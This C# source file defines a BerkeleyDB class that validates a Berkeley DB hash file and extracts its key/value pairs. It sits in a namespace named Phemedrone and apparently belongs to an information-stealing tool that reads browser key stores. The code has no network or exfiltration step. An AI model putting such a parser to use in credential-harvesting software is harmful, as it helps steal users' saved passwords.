using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Phemedrone.Classes
{
    public class BerkeleyDB
    {
        public List<KeyValuePair<string, string>> Keys { get; }
        
        public BerkeleyDB(byte[] file)
        {
            var entire = new List<byte>();
            Keys = new List<KeyValuePair<string, string>>();

            using (var stream = new MemoryStream(file))
            {
                using (var reader = new BinaryReader(stream))
                {
                    var pos = 0;
                    var length = (int)reader.BaseStream.Length;

                    while (pos < length)
                    {
                        entire.Add(reader.ReadByte());
                        pos += sizeof(byte);
                    }
                }
            }
            var magic = BitConverter.ToString(Extract(entire.ToArray(), 0, 4, false)).Replace("-", "");
            var pageSize = BitConverter.ToInt32(Extract(entire.ToArray(), 12, 4, true), 0);

            if (!magic.Equals("00061561")) return;
            
            var nbKey = int.Parse(BitConverter.ToString(Extract(entire.ToArray(), 0x38, 4, false)).Replace("-", ""));
            var page = 1;

            while (Keys.Count < nbKey)
            {
                var address = new string[(nbKey - Keys.Count) * 2];

                for (var i = 0; i < (nbKey - Keys.Count) * 2; i++)
                {
                    address[i] = BitConverter.ToString(Extract(entire.ToArray(), (pageSize * page) + 2 + (i * 2), 2, true)).Replace("-", "");
                }

                Array.Sort(address);

                for (var i = 0; i < address.Length; i += 2)
                {
                    var startValue = Convert.ToInt32(address[i], 16) + (pageSize * page);
                    var startKey = Convert.ToInt32(address[i + 1], 16) + (pageSize * page);
                    var end = ((i + 2) >= address.Length) ? pageSize + pageSize * page : Convert.ToInt32(address[i + 2], 16) + pageSize * page;

                    var key = Encoding.ASCII.GetString(Extract(entire.ToArray(), startKey, end - startKey, false));
                    var value = BitConverter.ToString(Extract(entire.ToArray(), startValue, startKey - startValue, false));

                    if (!string.IsNullOrWhiteSpace(key))
                    {
                        Keys.Add(new KeyValuePair<string, string>(key, value));
                    }

                }
                page++;
            }

        }

        private static byte[] Extract(byte[] source, int start, int length, bool littleEndian)
        {
            var dest = new byte[length];
            var j = 0;

            for (var i = start; i < start + length; i++)
            {
                dest[j] = source[i];
                j++;
            }

            if (littleEndian)
            {
                Array.Reverse(dest);
            }
            return dest;
        }
    }
}